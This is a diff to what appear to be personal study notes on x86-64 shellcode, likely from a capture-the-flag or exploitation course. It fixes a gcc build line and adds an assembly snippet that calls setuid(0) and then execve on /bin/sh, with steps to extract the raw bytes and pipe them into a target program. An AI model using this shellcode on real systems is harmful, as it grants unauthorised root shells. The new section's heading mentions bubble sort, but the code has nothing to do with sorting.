@@ -42,7 +42,7 @@ syscall				# trigger exit()
 ```
 
 # RUN WITH PROMPT
-+ gcc -nostdlib -static shellcode2.s -o shellcode-elf
++ gcc -nostdlib -static shellcode.s -o shellcode-elf
 + objcopy --dump-section .text=shellcode-raw shellcode-elf
 + (cat shellcode-raw; cat) | ./blah
 
@@ -224,6 +224,29 @@ mov rsi, 0              # this makes the second argument, argv, NULL
 mov rdx, 0              # this makes the third argument, envp, NULL
 syscall                 # this triggers the system call
 binsh:                          # a label marking where the /bin/sh string is
+.string "/bin/sh"
+```
+
+# SHELL CODE BUBLE SORT
+```s
+push 0
+pop rdi
+push 105
+pop rax
+syscall
+
+
+mov rax, 59
+lea rdi, [rip+binsh]
+pop rsi
+
+mov rsi, 0
+mov rdx, 0
+syscall
+stc
+stc
+
+binsh:
 .string "/bin/sh"
 ```
 
